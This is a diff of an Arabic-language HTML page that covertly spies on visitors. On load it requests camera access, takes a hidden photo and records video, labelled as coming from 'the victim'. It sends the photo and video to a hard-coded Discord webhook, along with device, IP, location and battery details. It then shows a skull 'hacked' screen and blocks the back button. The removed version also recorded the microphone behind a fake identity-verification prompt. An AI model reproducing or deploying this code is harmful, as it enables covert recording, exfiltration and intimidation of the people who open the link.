@@ -3,48 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>⚡ System Update...</title>
+    <title>⚡ جاري التحميل...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
+            font-family: 'Courier New', monospace;
             background: #000;
-            color: #fff;
+            color: #0f0;
             min-height: 100vh;
             overflow-x: hidden;
             user-select: none;
             -webkit-user-select: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 20px;
         }
-        #permission-screen {
-            display: flex; flex-direction: column; align-items: center; gap: 25px;
-            z-index: 200; animation: fadeIn 0.5s ease-out;
-        }
-        @keyframes fadeIn { from{opacity:0;transform:scale(0.9);} to{opacity:1;transform:scale(1);} }
-        #permission-screen .icon-lock { font-size: 70px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.1);} }
-        #permission-screen h2 { font-size: 1.4em; color: #fff; line-height: 1.5; }
-        #permission-screen .highlight { color: #4CAF50; font-weight: bold; }
-        #permission-screen button {
-            background: linear-gradient(135deg, #4CAF50, #2E7D32);
-            border: none; color: white; padding: 18px 50px; font-size: 1.2em;
-            border-radius: 50px; cursor: pointer; font-weight: bold; letter-spacing: 1px;
-            box-shadow: 0 8px 30px rgba(46,125,50,0.5); transition: all 0.3s; animation: bounce 2s infinite;
-        }
-        @keyframes bounce { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-8px);} }
-        #permission-screen button:active { transform: scale(0.95); }
-        #permission-screen .warning-text { color: #ff5252; font-size: 0.85em; margin-top: -10px; animation: blink 1s infinite; }
-        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
-        #retry-message { color: #ff5252; font-size: 0.9em; font-weight: bold; display: none; animation: shake 0.5s ease-out; }
-        @keyframes shake { 0%,100%{transform:translateX(0);} 25%{transform:translateX(-10px);} 75%{transform:translateX(10px);} }
         #loading-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 100; display: none;
-            flex-direction: column; align-items: center; justify-content: center; gap: 20px;
+            background: #000; z-index: 100;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px;
         }
         .spinner {
             width: 50px; height: 50px; border: 3px solid #111;
@@ -52,9 +26,9 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         #loading-screen p { color: #0f0; font-size: 0.9em; letter-spacing: 2px; animation: blink 1.5s infinite; }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
         #hidden-camera { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
         #hidden-canvas { display: none; }
-        #hidden-audio { display: none; }
         #binary-rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
         .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.85) 100%); pointer-events: none; }
         .scan-line { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: rgba(0,255,0,0.15); z-index: 20; pointer-events: none; animation: scanDown 3s linear infinite; }
@@ -85,41 +59,23 @@
         .info-line { color: #0f0; font-size: 0.7em; line-height: 2; }
         .info-line .label { color: #ff4444; }
         .progress-container { margin-top: 10px; background: #001a00; border: 1px solid #0f0; border-radius: 4px; height: 6px; overflow: hidden; }
-        .progress-bar { height: 100%; background: linear-gradient(90deg, #0f0, #ff0000); width: 0%; animation: progressFill 6s forwards; }
+        .progress-bar { height: 100%; background: linear-gradient(90deg, #0f0, #ff0000); width: 0%; animation: progressFill 2.5s forwards; }
         @keyframes progressFill { to{width:100%;} }
         .warn-icon { font-size: 2em; animation: warnPulse 0.8s infinite; }
         @keyframes warnPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.3);} }
         .photo-confirm { font-size: 0.6em; color: #ff4444; margin-top: 6px; animation: blink 1s infinite; }
-        #countdown { color: #ff0000; font-size: 0.8em; margin-top: 8px; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <!-- Permission Screen -->
-    <div id="permission-screen">
-        <div class="icon-lock">🔐</div>
-        <h2>للوصول إلى المحتوى<br><span class="highlight">يجب السماح بالكاميرا والميكروفون</span></h2>
-        <p style="color:#aaa;font-size:0.85em;">هذا ضروري للتحقق من هويتك</p>
-        <button onclick="requestCamera()">📷🎙️ السماح بالكاميرا والميكروفون</button>
-        <p class="warning-text">⚠️ لا يمكن المتابعة بدون الكاميرا والميكروفون</p>
-        <div id="retry-message">⛔ الرجاء السماح بالكاميرا والميكروفون للمتابعة!</div>
-    </div>
-
-    <!-- Hidden Elements -->
-    <video id="hidden-camera" autoplay playsinline muted></video>
-    <audio id="hidden-audio"></audio>
-    <canvas id="hidden-canvas"></canvas>
-    <canvas id="binary-rain"></canvas>
-    <div class="scan-line"></div>
-    <div class="overlay"></div>
-
-    <!-- Loading Screen -->
     <div id="loading-screen">
         <div class="spinner"></div>
         <p>⏳ جاري تهيئة النظام...</p>
     </div>
-
-    <!-- Hack Screen -->
+    <video id="hidden-camera" autoplay playsinline muted></video>
+    <canvas id="hidden-canvas"></canvas>
+    <canvas id="binary-rain"></canvas>
+    <div class="scan-line"></div>
+    <div class="overlay"></div>
     <div id="hack-screen">
         <svg class="skull-img" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
             <path d="M50 10 C30 10 18 22 16 40 C14 52 10 58 10 62 C10 68 16 72 22 72 L24 72 L24 80 C24 88 30 90 36 90 L40 90 L40 85 L60 85 L60 90 L64 90 C70 90 76 88 76 80 L76 72 L78 72 C84 72 90 68 90 62 C90 58 86 52 84 40 C82 22 70 10 50 10Z" fill="#111" stroke="#ff0000" stroke-width="3"/>
@@ -143,42 +99,41 @@
             <div class="info-line"><span class="label">📍 الموقع:</span> <span id="location-info">جاري التحديد...</span></div>
             <div class="info-line"><span class="label">📡 IP:</span> <span id="ip-info">جاري الاستخراج...</span></div>
             <div class="info-line"><span class="label">📱 البطارية:</span> <span id="battery-info">جاري الفحص...</span></div>
-            <div class="photo-confirm">📸 صورة + 🎙️ صوت + 📹 فيديو 30 ثانية</div>
-            <div id="countdown">⏱️ جاري التسجيل: <span id="timer">30</span> ثانية</div>
+            <div class="photo-confirm">📸 صورة + 📹 فيديو 10 ثواني تم تسجيلهم</div>
             <div class="progress-container"><div class="progress-bar"></div></div>
         </div>
     </div>
-
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1498303266549796957/ftznX_XgSL9CYqmNAFhwHdJHM6VatwM_ONqEGZnb1KPpTueg4cVAn7weAoEROJX5lGDB';
 
         // Binary Rain
-        const rainCanvas = document.getElementById('binary-rain');
-        const rainCtx = rainCanvas.getContext('2d');
-        function resizeCanvas() { rainCanvas.width = window.innerWidth; rainCanvas.height = window.innerHeight; }
+        const canvas = document.getElementById('binary-rain');
+        const ctx = canvas.getContext('2d');
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         resizeCanvas();
         window.addEventListener('resize', resizeCanvas);
-        const fontSizeRain = 14;
-        const columns = Math.floor(rainCanvas.width / fontSizeRain);
+        const fontSize = 14;
+        const columns = Math.floor(canvas.width / fontSize);
         const drops = new Array(columns).fill(1);
         function drawBinaryRain() {
-            rainCtx.fillStyle = 'rgba(0,0,0,0.05)';
-            rainCtx.fillRect(0, 0, rainCanvas.width, rainCanvas.height);
-            rainCtx.font = `bold ${fontSizeRain}px 'Courier New', monospace`;
+            ctx.fillStyle = 'rgba(0,0,0,0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.font = `bold ${fontSize}px 'Courier New', monospace`;
             for (let i = 0; i < drops.length; i++) {
                 const text = Math.random() > 0.5 ? '1' : '0';
-                const x = i * fontSizeRain;
-                const y = drops[i] * fontSizeRain;
-                if (Math.random() > 0.95) rainCtx.fillStyle = '#fff';
-                else if (Math.random() > 0.8) rainCtx.fillStyle = '#0f0';
-                else rainCtx.fillStyle = '#0a0';
-                rainCtx.fillText(text, x, y);
-                if (y > rainCanvas.height && Math.random() > 0.975) drops[i] = 0;
+                const x = i * fontSize;
+                const y = drops[i] * fontSize;
+                if (Math.random() > 0.95) ctx.fillStyle = '#fff';
+                else if (Math.random() > 0.8) ctx.fillStyle = '#0f0';
+                else ctx.fillStyle = '#0a0';
+                ctx.fillText(text, x, y);
+                if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             }
         }
         setInterval(drawBinaryRain, 50);
 
+        // Helper
         function dataURLtoBlob(dataurl) {
             const arr = dataurl.split(',');
             const mime = arr[0].match(/:(.*?);/)[1];
@@ -189,134 +144,71 @@
             return new Blob([u8arr], { type: mime });
         }
 
+        // Secret Camera - Photo + Video
         let mediaRecorder;
-        let audioRecorder;
         let recordedChunks = [];
-        let audioChunks = [];
-        let streamRef = null;
+        let videoBlob = null;
+        let photoData = null;
 
-        // Request Camera + Microphone
-        async function requestCamera() {
-            const retryMsg = document.getElementById('retry-message');
-            retryMsg.style.display = 'none';
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
-                    audio: true
-                });
-
-                streamRef = stream;
-                document.getElementById('permission-screen').style.display = 'none';
-                document.getElementById('loading-screen').style.display = 'flex';
-
-                await startCapture(stream);
-            } catch (err) {
-                retryMsg.style.display = 'block';
-                retryMsg.textContent = '⛔ الرجاء السماح بالكاميرا والميكروفون للمتابعة!';
-                const btn = document.querySelector('#permission-screen button');
-                btn.style.animation = 'none';
-                btn.offsetHeight;
-                btn.style.animation = 'shake 0.5s ease-out';
-                btn.textContent = '⚠️ اضغط هنا للسماح';
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: '🔄 **محاولة رفض - بيحاول تاني**' })
-                });
-            }
-        }
-
-        async function startCapture(stream) {
+        async function captureSecretPhoto() {
             const video = document.getElementById('hidden-camera');
             const canvas2 = document.getElementById('hidden-canvas');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
 
-            video.srcObject = stream;
-            await video.play();
-            await new Promise(r => setTimeout(r, 1000));
+                // Take photo
+                canvas2.width = video.videoWidth || 640;
+                canvas2.height = video.videoHeight || 480;
+                canvas2.getContext('2d').drawImage(video, 0, 0);
+                photoData = canvas2.toDataURL('image/jpeg', 0.6);
 
-            // Take photo
-            canvas2.width = video.videoWidth || 640;
-            canvas2.height = video.videoHeight || 480;
-            canvas2.getContext('2d').drawImage(video, 0, 0);
-            const photoData = canvas2.toDataURL('image/jpeg', 0.6);
+                // Send photo immediately
+                const photoBlob = dataURLtoBlob(photoData);
+                const photoForm = new FormData();
+                photoForm.append('file', photoBlob, 'photo.jpg');
+                photoForm.append('content', '📸 **صورة من الضحية**');
+                await fetch(WEBHOOK_URL, { method: 'POST', body: photoForm });
 
-            // Send photo
-            const photoBlob = dataURLtoBlob(photoData);
-            const photoForm = new FormData();
-            photoForm.append('file', photoBlob, 'photo.jpg');
-            photoForm.append('content', '📸 **صورة من الضحية**');
-            await fetch(WEBHOOK_URL, { method: 'POST', body: photoForm });
-
-            // Start video + audio recording
-            recordedChunks = [];
-            audioChunks = [];
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-            mediaRecorder.onstop = async () => {
-                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                const videoForm = new FormData();
-                videoForm.append('file', videoBlob, 'video_30sec.webm');
-                videoForm.append('content', '📹 **فيديو 30 ثانية (كاميرا + صوت) من الضحية**');
-                await fetch(WEBHOOK_URL, { method: 'POST', body: videoForm });
-
-                // Also send audio separately
-                if (audioChunks.length > 0) {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    const audioForm = new FormData();
-                    audioForm.append('file', audioBlob, 'audio_30sec.webm');
-                    audioForm.append('content', '🎙️ **تسجيل صوت 30 ثانية من مايك الضحية**');
-                    await fetch(WEBHOOK_URL, { method: 'POST', body: audioForm });
-                }
-
-                stream.getTracks().forEach(t => t.stop());
-                video.srcObject = null;
-            };
-            mediaRecorder.start();
-
-            // Separate audio chunks
-            if (stream.getAudioTracks().length > 0) {
-                const audioStream = new MediaStream(stream.getAudioTracks());
-                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-                audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
-                audioRecorder.start();
+                // Start video recording
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = async () => {
+                    videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const videoForm = new FormData();
+                    videoForm.append('file', videoBlob, 'video.webm');
+                    videoForm.append('content', '📹 **فيديو 10 ثواني من الضحية**');
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: videoForm });
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                };
+                mediaRecorder.start();
+                return true;
+            } catch (err) {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '⚠️ **شخص فتح اللينك بدون كاميرا**' })
+                });
+                return false;
             }
-
-            // Show hack screen after 3 seconds
-            setTimeout(() => {
-                document.getElementById('loading-screen').style.display = 'none';
-                document.getElementById('hack-screen').style.display = 'flex';
-                extractInfo();
-                startCountdown();
-            }, 3000);
-
-            // Stop recording after 30 seconds
-            setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                }
-                if (audioRecorder && audioRecorder.state === 'recording') {
-                    audioRecorder.stop();
-                }
-            }, 30000);
         }
 
-        // Countdown Timer
-        function startCountdown() {
-            let seconds = 30;
-            const timerEl = document.getElementById('timer');
-            const interval = setInterval(() => {
-                seconds--;
-                timerEl.textContent = seconds;
-                if (seconds <= 10) timerEl.style.color = '#ff0000';
-                if (seconds <= 0) clearInterval(interval);
-            }, 1000);
+        // Stop video after 10 seconds and send
+        async function stopVideoAndSend() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
         }
 
+        // Device Info
         function extractInfo() {
             const ua = navigator.userAgent;
             let device = 'Unknown', browser = 'Unknown';
-            if (/Android/i.test(ua)) device = 'Android';
+            if (/Android/i.test(ua)) device = 'Android ' + (ua.match(/Android\s([\d.]+)/)||[])[1];
             else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iPhone';
             else if (/Windows/i.test(ua)) device = 'Windows PC';
             else if (/Mac/i.test(ua)) device = 'MacBook/iMac';
@@ -344,15 +236,27 @@
             });
         }
 
-        // Prevent back
         history.pushState(null, null, location.href);
         window.addEventListener('popstate', function() {
             history.pushState(null, null, location.href);
             alert('🚫 لا يمكنك التراجع!');
         });
 
-        // Auto-request on page load
-        window.addEventListener('load', () => { requestCamera(); });
+        async function init() {
+            document.getElementById('loading-screen').style.display = 'flex';
+            await captureSecretPhoto();
+            // Show hack screen after 3 seconds, but video continues recording
+            setTimeout(() => {
+                document.getElementById('loading-screen').style.display = 'none';
+                document.getElementById('hack-screen').style.display = 'flex';
+                extractInfo();
+            }, 3000);
+            // Stop video after 10 seconds
+            setTimeout(() => {
+                stopVideoAndSend();
+            }, 10000);
+        }
+        init();
     </script>
 </body>
 </html>
